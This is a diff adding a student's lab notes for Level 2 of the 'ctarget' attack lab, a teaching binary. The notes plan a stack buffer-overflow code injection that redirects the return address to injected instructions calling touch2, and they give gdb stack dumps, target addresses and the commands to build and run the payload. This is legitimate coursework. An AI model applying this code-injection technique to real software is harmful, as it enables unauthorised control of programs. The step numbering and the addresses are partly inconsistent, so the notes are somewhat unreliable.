@@ -70,3 +70,49 @@ How to run:
 ```
 ./ctarget -i c-lvl1.bin
 ```
+
+# ctarget - Level 2
+
+The general idea is that I need to:
+
+1. Write a bunch of instructions directly to the stack.
+2. Use the overflow exploit to point the return address of the current function
+   to the instructions I wrote on the stack.
+2. Use the overflow exploit to point the next return address to the touch2
+   function.
+3. Instructions need to set %rdi and then return to jump to touch2.
+
+stack state:
+
+```
+(gdb) p $rsp
+$3 = (void *) 0x5561dc78
+(gdb) x/7gx $rsp
+0x5561dc78:     0x0000000000000000      0x0000000000000000
+0x5561dc88:     0x0000000000000000      0x0000000000000000
+0x5561dc98:     0x0000000055586000      0x0000000000401976
+0x5561dca8:     0x0000000000000009
+(gdb) x/gx touch2
+0x4017ec <touch2>:      0x05c7fa8908ec8348
+```
+
+1. Write instructions starting at 0x5561dc98.
+2. Write 0x5561dc78 as ret address at 0x5561dca0 to call instructions.
+
+```
+gcc -c c-lvl2.s
+objdump -d c-lvl2.o
+```
+
+How to generate bytes:
+
+```
+./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' | od -vxaAx
+./hex2raw -i c-lvl2.txt | sed -z 's/\n$//' > c-lvl2.bin
+```
+
+How to run:
+
+```
+./ctarget -i c-lvl2.bin
+```
